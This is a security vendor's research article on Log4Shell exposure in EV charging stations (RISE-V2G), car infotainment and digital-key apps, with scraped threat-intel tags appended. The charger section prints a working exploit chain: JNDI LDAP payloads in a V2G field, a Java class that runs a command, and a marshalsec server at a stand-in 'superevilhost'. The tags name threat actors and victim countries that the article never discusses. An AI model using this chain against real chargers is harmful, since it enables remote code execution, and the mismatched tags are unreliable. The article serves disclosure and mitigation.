# Examining Log4j Vulnerabilities in Connected Cars and Charging Stations
### In this entry we look into how Log4j vulnerabilities affect devices or properties embedded in or used for connected cars, specifically chargers, in-vehicle infotainment systems, and digital remotes for opening cars.

## Information:
+ Source: Trend Micro
+ Link: https://www.trendmicro.com/en_us/research/21/l/examining-log4j-vulnerabilities-in-connected-cars.html
+ Date: 2021-12-23
+ Author: None


## Article:
![Article Image](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/l/examining-log4j-vulnerabilities-in-connected-cars-and-charging-stations/examining-log4j-vulnerabilities-in-connected-cars.jpg)





Since its disclosure on Dec. 9, a vast number of articles have been written on the remote code execution (RCE) vulnerability in the library [Apache Log4j](/en_us/research/21/l/patch-now-apache-log4j-vulnerability-called-log4shell-being-acti.html) — a reflection of its impact. The library is used by innumerable programs to easily release log statements without modifying the code. This means that it has an expansive attack surface, with Amazon, Apple, Cloudflare, Google, Tencent, Twitter, and many other well-known entities having been [vulnerable targets](https://github.com/YfryTchsGD/Log4jAttackSurface) at some point. Further expanding the attack surface, the vulnerability, dubbed Log4Shell, affects even embedded devices that use this library. In this report, we focus on the devices or properties found in or used for cars, specifically chargers, in-vehicle infotainment (IVI) systems, and “digital remotes” for opening cars.


Car chargers at risk
====================


In Europe, the vehicle-to-grid (V2G) system is already available. This system allows stored energy in car batteries to be redistributed over the grid to help balance demand vis-à-vis production level. 






![Figure 1. A simple V2G infrastructure](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/21/l/examining-log4j-vulnerabilities-in-connected-cars-and-charging-stations/figure%201%20v2g%20diagram.jpg)
Figure 1. A simple V2G infrastructure





*Image reference:* [*Automobile Propre*](https://www.automobile-propre.com/)


A V2G system is composed of at least two parts:


* A plug-in electric vehicle (PEV), which is the car with its charging controller or electronic control unit (ECU)
* An electric vehicle supply equipment (EVSE), which is the charging station


Aside from these two, V2G charging stations are connected to the back-end Open Charge Point Protocol (OCPP).


While very few reports have been written on this domain, there are some topics of interest that are worth mentioning here. One is [V2GInjector](https://github.com/FlUxIuS/V2GInjector), which is a tool designed to penetrate V2G networks and attack electric cars and charging stations. More importantly, this tool is used by exploiting a vulnerability in the HomePlug Green PHY standard, which could allow a malicious actor to collect network keys, enter each network, and perform a man-in-the-middle (MitM) attack to inject fake data between chargers and cars. This could lead not only to fraud attacks but also to attacks on the charger, which runs on a complex operating system. The post on this tool mentions that some Secure Shell (SSH) and web accesses could be abused to get a shell on the charger, such as by web traversal vulnerabilities or root SSH access with weak passwords. However, after the disclosure of Log4Shell ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) and two more vulnerabilities in Log4j ([CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) and [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/CVE-2021-45105)), potential attackers might gain better access to chargers and cars using the V2G stack in Java.


In this section, we use RISE-V2G to test our assumption. RISE-V2G was an [Eclipse project](https://projects.eclipse.org/projects/iot.risev2g) whose name stands for “reference implementation supporting the evolution of V2G.” It was meant to be an open-source standard-compliant implementation and documentation for testing purposes, but support for it was already discontinued. V2G Clarity then took over the project to continue with commercial training and help people understand the protocols.


While RISE-V2G might seem less relevant today, we have found that some people not only use it for their proof-of-concept environments but also intend to use it in their final products. Moreover, the public project called [Joint Operating system for Seamless EV charging (Josev)](https://www.switch-ev.com/josev), described as the “brain of a charging station,” appears to also use this implementation, based on its GitHub [page](https://www.switch-ev.com/josev). We cannot know for sure if Josev will use RISE-V2G entirely as it is, but authors seem to have already put [a lot of effort](https://www.switch-ev.com/news-and-events/bulletproof-iso-15118-implementation-risev2g-tested-by-verisco-test-system) into RISE-V2G.


Therefore, for our purpose, the RISE-V2G framework seemed a perfect example of a charging station that used Java and that we could target and publicly disclose. But first, we needed to check if Log4j library is used by the framework. After cloning the project, we observed that many debug strings could be found with a simple *grep* command:







> $ grep -ir "log4j"       
> 
> RISE-V2G-EVCC/src/main/java/com/v2gclarity/risev2g/evcc/evController/DummyEVController.java:import org.apache.logging.log4j.LogManager;  
> 
> RISE-V2G-EVCC/src/main/java/com/v2gclarity/risev2g/evcc/evController/DummyEVController.java:**import** org.apache.logging.log4j.Logger;  
> 
> RISE-V2G-EVCC/src/main/java/com/v2gclarity/risev2g/evcc/session/V2GCommunicationSessionHandlerEVCC.java:import org.apache.logging.log4j.LogManager;  
> 
> RISE-V2G-EVCC/src/main/java/com/v2gclarity/risev2g/evcc/session/V2GCommunicationSessionHandlerEVCC.java:**import** org.apache.logging.log4j.Logger;  
> 
> RISE-V2G-EVCC/src/main/java/com/v2gclarity/risev2g/evcc/transportLayer/StatefulTransportLayerClient.java:import org.apache.logging.log4j.LogManager;  
> 
> RISE-V2G-EVCC/src/main/java/com/v2gclarity/risev2g/evcc/transportLayer/StatefulTransportLayerClient.java:**import** org.apache.logging.log4j.Logger;  
> 
> RISE-V2G-EVCC/src/main/java/com/v2gclarity/risev2g/evcc/transportLayer/UDPClient.java:import org.apache.logging.log4j.LogManager;  
> 
> RISE-V2G-EVCC/src/main/java/com/v2gclarity/risev2g/evcc/transportLayer/UDPClient.java:**import** org.apache.logging.log4j.Logger;  
> 
> RISE-V2G-EVCC/src/main/resources/log4j2.xml:<!-- see http://logging.apache.org/log4j/2.x/manual/configuration.html -->  
> 
> RISE-V2G-SECC/target/classes/log4j2.xml:<!-- see http://logging.apache.org/log4j/2.x/manual/configuration.html -->  
> 
> […]
> 
> 
> 






To investigate how RISE-V2G works and is used, we set up a small environment to simulate the V2G exchange between a PEV and an EVSE. To do that, we needed to compile the whole project and launch these two applications:


* RISE-V2G-SECC/target/rise-v2g-secc-1.2.6.jar for the EVSE
* RISE-V2G-EVCC/target/rise-v2g-evcc-1.2.6.jar for the PEV


This allowed us to get some logs on the supply equipment communication controller (SECC)/EVSE side:



> […]  
> 
> ?xml version="1.0" encoding="UTF-8" standalone="yes"?><ns6:V2G\_Message xmlns:ns6="urn:iso:15118:2:2013:MsgDef" xmlns:ns5="http://www.w3.org/2000/09/xmldsig#" xmlns:ns7="urn:iso:15118:2:2013:MsgBody" xmlns:ns2="urn:iso:15118:2:2010:AppProtocol" xmlns:ns4="urn:iso:15118:2:2013:MsgDataTypes" xmlns:ns3="urn:iso:15118:2:2013:MsgHeader"><ns6:Header><ns3:SessionID>E00A10527F79E3FF</ns3:SessionID></ns6:Header><ns6:Body><ns7:ChargingStatusRes><ns7:ResponseCode>OK</ns7:ResponseCode><ns7:EVSEID>DE*V2G*E12345</ns7:EVSEID><ns7:SAScheduleTupleID>1</ns7:SAScheduleTupleID><ns7:MeterInfo><ns4:MeterID>1</ns4:MeterID><ns4:MeterReading>32000</ns4:MeterReading><ns4:TMeter>1639589001</ns4:TMeter></ns7:MeterInfo><ns7:ReceiptRequired>false</ns7:ReceiptRequired><ns7:AC\_EVSEStatus><ns4:NotificationMaxDelay>0</ns4:NotificationMaxDelay><ns4:EVSENotification>None</ns4:EVSENotification><ns4:RCD>false</ns4:RCD></ns7:AC\_EVSEStatus></ns7:ChargingStatusRes></ns6:Body></ns6:V2G\_Message>  
> 
> 2021-12-15T18:23:21,088 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] EXIficientCodec: EXI encoded ChargingStatusRes: 809802380284149FDE78FFD0C0003D1114A958C91CA914C4C8CCD0D400080662080FA01222727A23418000000000  
> 
> 2021-12-15T18:23:21,088 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] EXIficientCodec: Base64 encoded ChargingStatusRes: gJgCOAKEFJ/eeP/QwAA9ERSpWMkcqRTEyMzQ1AAIBmIID6ASInJ6I0GAAAAAAA==  
> 
> 2021-12-15T18:23:21,088 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] ConnectionHandler: Message sent  
> 
> 2021-12-15T18:23:21,088 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] V2GCommunicationSessionSECC: New state is ForkState  
> 
> 2021-12-15T18:23:21,090 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] ConnectionHandler: Length of V2GTP payload **in** bytes according to V2GTP header: 13  
> 
> 2021-12-15T18:23:21,090 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] ConnectionHandler: Message received  
> 
> 2021-12-15T18:23:21,090 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] EXIficientCodec: Received EXI stream: 809802380284149FDE78FFD0B0  
> 
> 2021-12-15T18:23:21,091 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] EXIficientCodec: XML representation of ChargingStatusReq:  
> 
> <?xml version="1.0" encoding="UTF-8" standalone="yes"?><ns6:V2G\_Message xmlns:ns6="urn:iso:15118:2:2013:MsgDef" xmlns:ns5="http://www.w3.org/2000/09/xmldsig#" xmlns:ns7="urn:iso:15118:2:2013:MsgBody" xmlns:ns2="urn:iso:15118:2:2010:AppProtocol" xmlns:ns4="urn:iso:15118:2:2013:MsgDataTypes" xmlns:ns3="urn:iso:15118:2:2013:MsgHeader"><ns6:Header><ns3:SessionID>E00A10527F79E3FF</ns3:SessionID></ns6:Header><ns6:Body><ns7:ChargingStatusReq/></ns6:Body></ns6:V2G\_Message>  
> 
> 2021-12-15T18:23:21,091 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] V2GCommunicationSessionSECC: New state is WaitForChargingStatusReq  
> 
> 2021-12-15T18:23:21,091 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] WaitForChargingStatusReq: ChargingStatusReq received  
> 
> 2021-12-15T18:23:21,091 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] WaitForChargingStatusReq: Preparing to send ChargingStatusRes   
> 
> 2021-12-15T18:23:21,091 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] EXIficientCodec: XML representation of ChargingStatusRes:  
> 
> <?xml version="1.0" encoding="UTF-8" standalone="yes"?><ns6:V2G\_Message xmlns:ns6="urn:iso:15118:2:2013:MsgDef" xmlns:ns5="http://www.w3.org/2000/09/xmldsig#" xmlns:ns7="urn:iso:15118:2:2013:MsgBody" xmlns:ns2="urn:iso:15118:2:2010:AppProtocol" xmlns:ns4="urn:iso:15118:2:2013:MsgDataTypes" xmlns:ns3="urn:iso:15118:2:2013:MsgHeader"><ns6:Header><ns3:SessionID>E00A10527F79E3FF</ns3:SessionID></ns6:Header><ns6:Body><ns7:ChargingStatusRes><ns7:ResponseCode>OK</ns7:ResponseCode><ns7:EVSEID>DE*V2G*E12345</ns7:EVSEID><ns7:SAScheduleTupleID>1</ns7:SAScheduleTupleID><ns7:MeterInfo><ns4:MeterID>1</ns4:MeterID><ns4:MeterReading>32000</ns4:MeterReading><ns4:TMeter>1639589001</ns4:TMeter></ns7:MeterInfo><ns7:ReceiptRequired>false</ns7:ReceiptRequired><ns7:AC\_EVSEStatus><ns4:NotificationMaxDelay>0</ns4:NotificationMaxDelay><ns4:EVSENotification>None</ns4:EVSENotification><ns4:RCD>false</ns4:RCD></ns7:AC\_EVSEStatus></ns7:ChargingStatusRes></ns6:Body></ns6:V2G\_Message>  
> 
> 2021-12-15T18:23:21,092 DEBUG [ConnectionThread fe80:0:0:0:40**:*****:****:8f21%2] EXIficientCodec: EXI encoded ChargingStatusRes: 809802380284149FDE78FFD0C0003D1114A958C91CA914C4C8CCD0D400080662080FA01222727A23418000000000  
> 
> […]
> 
> 
> 


Summarizing the exchanges, Figure 2 shows a simple schema of the first states.






![Figure 2. A sample of V2G exchanges](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/21/l/examining-log4j-vulnerabilities-in-connected-cars-and-charging-stations/figure%202%20sample%20of%20v2g.jpg)
Figure 2. A sample of V2G exchanges




With further investigation, we saw that we could in fact trigger Log4j with the encoded V2G messages shown here:



> # **in** RISE-V2G-Shared/src/main/java/com/v2gclarity/risev2g/shared/exiCodec/EXIficientCodec.java  
> 
> […]  
> 
> public synchronized Object decodeEXI(byte[] exiEncodedMessage, boolean supportedAppProtocolHandshake) {  
> 
>         getLogger().debug("Received EXI stream: " + ByteUtils.**to**HexString(exiEncodedMessage));  
> 
>    
> 
>         ByteArrayInputStream bais = **new** ByteArrayInputStream(exiEncodedMessage);  
> 
>         setDecodedExi(decode(bais, supportedAppProtocolHandshake));  
> 
>    
> 
>         return unmarshallToMessage(getDecodedExi());  
> 
>     }  
> 
> […]
> 
> 
> 


As it was, it was still unexploitable, so we needed to further look at how these messages were decoded and at the output in logs:  





> # **in** ./RISE-V2G-Shared/src/main/java/com/v2gclarity/risev2g/shared/exiCodec/ExiCodec.java  
> 
> 
> 
> 
> […]  
> 
>     @SuppressWarnings("rawtypes")  
> 
>     public void showXMLRepresentationOfMessage(Object message) {  
> 
>         StringWriter sw = **new** StringWriter();  
> 
>         String className = "";  
> 
>    
> 
>         **if** (message instanceof V2GMessage) {  
> 
>             className = ((V2GMessage) message).getBody().getBodyElement().getName().getLocalPart();  
> 
>         } **else** **if** (message instanceof JAXBElement) {  
> 
>             className = ((JAXBElement) message).getName().getLocalPart();  
> 
>         } **else** **if** (message instanceof SupportedAppProtocolReq) {  
> 
>             className = "SupportedAppProtocolReq";  
> 
>         } **else** **if** (message instanceof SupportedAppProtocolRes) {  
> 
>             className = "SupportedAppProtocolRes";  
> 
>         } **else** {  
> 
>             className = "marshalled JAXBElement";  
> 
>         }  
> 
>    
> 
>         **try** {  
> 
>             getMarshaller().marshal(message, sw);  
> 
>             getLogger().debug("XML representation of " + className + ":\n" + sw.**to**String());  
> 
>         } catch (JAXBException e) {  
> 
>             getLogger().error(e.getClass().getSimpleName() + " occurred while trying to show XML representation of " + className, e);  
> 
>         }  
> 
>     }  
> 
> […]
> 
> 
> 


The underlined path looked to be a perfect entry for us. It should be noted that this code is common between the electric vehicle communication controller (EVCC) — that is, the car — and the EVSE (the charging station). Therefore, this could also be triggered on a car module that uses this implementation. But as far as we know, the ECUs of most cars use a C++ implementation, as most of the architecture in ECUs can be as exotic as the TriCore microcontroller architecture. We therefore expect this vulnerability to be found at least in chargers.






It should also be noted that data exchanged between the vehicle and the charger was encoded in [Efficient XML Interchange (EXI)](https://www.chademo.com/wp2016/wp-content/uploads/2013/03/14InfrastructureWS/14_infraWS_Presentation_Fujitsu.pdf). To encode it, we made a tool called the [V2Gdecoder](https://github.com/FlUxIuS/V2Gdecoder), which can decode and encode EXI payloads. The following code presents an example of encoding XML data into an EXI binary:



>  
> 
> 
> $ java -jar target/V2Gdecoder-jar-with-dependencies.jar -x -s '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><**ns6:V2G\_Message** xmlns:ns6="urn:iso:15118:2:2013:MsgDef" xmlns:ns5="http://www.w3.org/2000/09/xmldsig#" xmlns:ns7="urn:iso:15118:2:2013:MsgBody" xmlns:ns2="urn:iso:15118:2:2010:AppProtocol" xmlns:ns4="urn:iso:15118:2:2013:MsgDataTypes" xmlns:ns3="urn:iso:15118:2:2013:MsgHeader"><**ns6:Header**><**ns3:SessionID**>E00A10527F79E3FF</**ns3:SessionID**></**ns6:Header**><**ns6:Body**><**ns7:ChargingStatusReq**/></**ns6:Body**></**ns6:V2G\_Message**>'  
> 
>   
> 
> 809802380284149FDE78FFD0B0
> 
> 
> 


But to trigger the vulnerability, we needed to be aware of the types used by the XML data and find an element or an attribute that would allow us to inject a string. By looking quickly into the XML scheme definitions (XSDs), we found *ProtocolNamespace*and other notable fields:



> […]  
> 
> <**x**s:element name=”ProtocolNamespace” type=”protocolNamespaceType”/>  
> 
> <**x**s:element name=”VersionNumberMajor” type=”xs:unsignedInt”/>  
> 
> <**x**s:element name=”VersionNumberMinor” type=”xs:unsignedInt”/>  
> 
> <**x**s:element name=”SchemaID” type=”idType”/>  
> 
> <**x**s:element name=”Priority” type=”priorityType”/>  
> 
> </**x**s:sequence>  
> 
> </**x**s:complexType>  
> 
> <**x**s:simpleType name=”idType”>  
> 
> <**x**s:restriction base=”xs:unsignedByte”/>  
> 
> </**x**s:simpleType>  
> 
> <**x**s:simpleType name=”protocolNameType”>  
> 
> <**x**s:restriction base=”xs:string”>  
> 
> […]
> 
> 
> 


Finally, to quickly look if the vulnerability is exploitable, we made the following payload using the Canarytokens service, which has also recently gained more attention since the disclosure of Log4Shell:



> <?xml version="1.0" encoding="UTF-8"?><**ns4:supportedAppProtocolReq** xmlns:ns4="urn:iso:15118:2:2010:AppProtocol" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:ns3="http://www.w3.org/2001/XMLSchema"><**AppProtocol**>**<ProtocolNamespace**>${jndi:ldap://x${hostName}.L4J.36gy1a*********qu.canarytokens.com/a}</**ProtocolNamespace>****VersionNumberMajor**>2</**VersionNumberMajor**><**VersionNumberMinor**>0</**VersionNumberMinor**><**SchemaID**>10</**SchemaID**><**Priority**>1</**Priority**></**AppProtocol**></**ns4:supportedAppProtocolReq**
> 
> 
> 


It is convenient to use the token generated by Canarytokens as it will also send a notification should the vulnerability be triggered.


We then used the V2GInjector framework to emulate a fake EVCC or car and attack on the first state, as illustrated in Figure 3.






![Figure 3. Attacking the first state with V2GInjector](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/21/l/examining-log4j-vulnerabilities-in-connected-cars-and-charging-stations/figure%203%20v2g%20attack.jpg)
Figure 3. Attacking the first state with V2GInjector




After the SECC procedure, the framework (with the help of our V2Gdecoder) encoded the XML payload and sent it to the EVCC using the Vehicle-to-Grid Transfer Protocol (V2GTP) layer. The fake EVCC then sent the malicious payload, which caused the SECC application to freeze. Finally, we were directly notified by Canarytokens, as shown in Figure 4.






![Figure 4. Canarytokens’ alert for a Log4j vulnerability detection](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/21/l/examining-log4j-vulnerabilities-in-connected-cars-and-charging-stations/figure%204%20canarytokens%20alert.jpg)
Figure 4. Canarytokens’ alert for a Log4j vulnerability detection




Again, we note that intruding a V2G network is likely to happen after exploiting the HomePlug Green Phy keys collection flaws mentioned in [V2GInjector’s documentation](https://github.com/NCSC-NL/log4shell/tree/main/software).


We took this test a little further by executing code and writing a “VeryEvil” exploit:



> **public** **class** **VeryEvil** {  
> 
>     **static** {  
> 
>         **try** {  
> 
>             **String** [] cmd={"touch /tmp/choucroute"};  
> 
>             java.lang.Runtime.getRuntime().exec(cmd).waitFor();  
> 
>         }**catch** (Exception e){  
> 
>             e.printStackTrace();  
> 
>         }  
> 
>     }  
> 
>    
> 
> }
> 
> 
> After typing VeryEvil, we compiled it:
> 
> 
> $ javac VeryEvil.java  
> 
> $ ls VeryEvil.*  
> 
> VeryEvil.**class**  VeryEvil.java
> 
> 
> 


Then, we called the *marshalsec* tool to distribute it and ran a web server on port TCP 80 to forward the class in parallel by default: 



> $ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://superevilhost#VeryEvil  
> 
> Listening on 0.0.0.0:1389
> 
> 
> 



> java -jar target/V2Gdecoder-jar-with-dependencies.jar -x -s '<?xml version="1.0" encoding="UTF-8"?><**ns4:supportedAppProtocolReq** xmlns:ns4="urn:iso:15118:2:2010:AppProtocol" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:ns3="http://www.w3.org/2001/XMLSchema"><**AppProtocol**><**ProtocolNamespace**>${jndi:ldap://superevilhost:1389/EvilObject}</**ProtocolNamespace**><**VersionNumberMajor**>2</**VersionNumberMajor**><**VersionNumberMinor**>0</**VersionNumberMinor**><**SchemaID**>10</**SchemaID**><**Priority**>1</**Priority**></**AppProtocol**></**ns4:supportedAppProtocolReq**>'  
> 
> 80017123DB53732349D363230B81D1797B9BAB832B932BB34B63437B9BA1D18999C1C97A2BB34B627B13532B1BA3E8020000280040
> 
> 
> 


We finished by readapting the *jndi* URL (as seen in the preceding code) to inject during V2G exchanges. 






Car IVI systems compromised in the wild
=======================================


Charging stations are not the only targets that could be affected by this vulnerability in the automotive industry. Cars’ IVI systems could also be subjected to real threats.


A car’s IVI system uses a complex operating system to display not only a user interface but also a web browser. Users can also install applications like Twitter and Facebook on the IVI system. Connected to the internet through a mobile 2G/3G/4G/5G module, IVI systems could be subjected to attacks if they also use the Java Log4j library. In fact, in a [previous research](https://penthertz.com/resources/Troopers_NGI_2019-Modmobtools_and_tricks.pdf), we found that some IVI modules had been using old versions of Android 4.0.4.






![Figure 5. The use of old version of Android in some cars’ IVI modules](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/21/l/examining-log4j-vulnerabilities-in-connected-cars-and-charging-stations/figure%205%20use%20of%20old%20android%20car.png)
Figure 5. The use of old version of Android in some cars’ IVI modules




Evidence of attacks using the Log4j vulnerability was also shown in a test that triggered a bug on a Tesla car. For this case, the source does not provide much information on where it was actually executed. Nevertheless, this means that the exploitation of the vulnerability could still have an impact on the user’s privacy and the general security of the car because a back-end compromise could allow attackers to push actions to the car and serve malicious firmware over-the-air (FOTA) updates.


Digital keys vulnerable to Log4Shell?


Smartphones can now replace key fobs as so-called “digital keys” that can control some parts of cars. The applications that allow this could also be vulnerable to the Log4j vulnerability. The Frida script [log4JFrida](https://github.com/Ch0pin/log4JFrida) can be used to test this assumption, allowing one to change several characteristics of a car to trigger the vulnerability.


Mitigation
==========


Beyond the three devices or properties in modern cars discussed in this article, there are still many more to test and monitor for Log4j vulnerabilities. Among them are servers’ responses to tests and plenty of other vectors that could allow attackers to use the access afforded by applications to send commands that can unlock a car, control the heating, and perform other functions that can be abused by malicious actors.


Up to now, organizations and security experts are still grappling with the full extent of the Log4j vulnerabilities. It is likely that more reports looking into the effects of these vulnerabilities in specific services, devices, or applications will be released in the coming weeks. On the other hand, cybercriminals are also making the most of this time to catch potential victims, including those who are still exposed via unpatched Log4j vulnerabilities, off guard.


The main fix for the vulnerabilities is to update Log4j to version 2.17.0. This version removes the message lookup feature, which provides a way to add values to Log4j’s configuration, entirely. However, in most cases, such as RISE-V2G, using an up-to-date version of Log4j could break applications.


Another option is to enable “formatMsgNoLookups=true” when configuring Log4j or invoking this flag when running Log4j as described in LunaSec’s [mitigation guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/):



> java -Dlog4j2.formatMsgNoLookups=true ...
> 
> 
> 


It is also possible to disable logs altogether if they are not needed. RISE-V2G, for example, has an option to do this in its configuration files by disabling EXI and XML display:



> # XML representation of messages  
> 
> #-------------------------------  
> 
> #  
> 
> # Possible values:  
> 
> # - true  
> 
> # - false  
> 
> # If this value is set to 'true', the EXICodec will print each message's XML representation (for debugging purposes)  
> 
> # If no correct value is provided here, 'false' will be chosen  
> 
> exi.messages.showxml = false  
> 
>    
> 
> # Hexadecimal and Base64 representation of messages  
> 
> #--------------------------------------------------  
> 
> #  
> 
> # Possible values:  
> 
> # - true  
> 
> # - false  
> 
> # If this value is set to 'true', the EXICodec will print each message's hexadecimal and Base64 representation (for debugging purposes)  
> 
> # If no correct value is provided here, 'false' will be chosen  
> 
> exi.messages.showhex = false
> 
> 
> 


We have put up a [support page](https://success.trendmicro.com/solution/000289940) that includes a list of our products that can help with detection and prevention, along with information pertaining to our own products’ being vulnerable or not.


We have also created an [assessment tool](https://resources.trendmicro.com/Log4Shell-Vulnerability-Assessment.html)  for identifying server applications and endpoints that might be affected by the Log4j vulnerabilities. The tool also provides a detailed view of the attack surface and the next steps for mitigating risks.








## Tags:

#### Threatactor:
[[threatactor.name=Sidewinder]]

#### Action:
[[action.malware.name=at]] [[action.malware.name=Charger]] [[action.malware.name=cmd]] [[action.malware.name=cmd]] [[action.malware.name=Conti]] [[action.malware.name=Elise]] [[action.malware.name=Expand]] [[action.malware.name=Net]] [[action.malware.name=Ping]] [[action.malware.name=Ping]] [[action.malware.name=REvil]] [[action.malware.name=route]] [[action.malware.name=S-Type]] [[action.malware.name=Tor]] [[action.malware.name=yty]]

#### Location:
[[victim.country.name=Mali]] [[victim.continent.name=Africa]] [[victim.continent.name=Europe]] [[victim.city.name=]] [[victim.country.name=Haiti]] [[victim.continent.name=North and Central America]]

### Autogenerated Tags:
[[Log4j]] [[[connectionthread]] [[Fe80:0:0:0:40**:*****:****:8f21%2]]] [[V2g]] [[Rise-v2g]] [[Ivi]] [[Exificientcodec]] [[Chargingstatusres]] [[2021-12-15t18:23:21,091]] [[Xml]] [[Trend Micro]]
#### ipv4-adresses
0.0.0.0
#### urls
http://logging.apache.org/log4j/2.x/manual/configuration.html http://www.w3.org/2000/09/xmldsig# http://www.w3.org/2001/XMLSchema-instance http://www.w3.org/2001/XMLSchema ldap://x${hostName}.L4J.36gy1a*********qu.canarytokens.com/a}</ProtocolNamespace>VersionNumberMajor>2</VersionNumberMajor><VersionNumberMinor>0</VersionNumberMinor><SchemaID>10</SchemaID><Priority>1</Priority></AppProtocol></ns4:supportedAppProtocolReq http://superevilhost#VeryEvil ldap://superevilhost:1389/EvilObject}</ProtocolNamespace><VersionNumberMajor>2</VersionNumberMajor><VersionNumberMinor>0</VersionNumberMinor><SchemaID>10</SchemaID><Priority>1</Priority></AppProtocol></ns4:supportedAppProtocolReq>'
#### CVE's
[[CVE-2021-44228]] [[CVE-2021-45046]] [[CVE-2021-45105]]

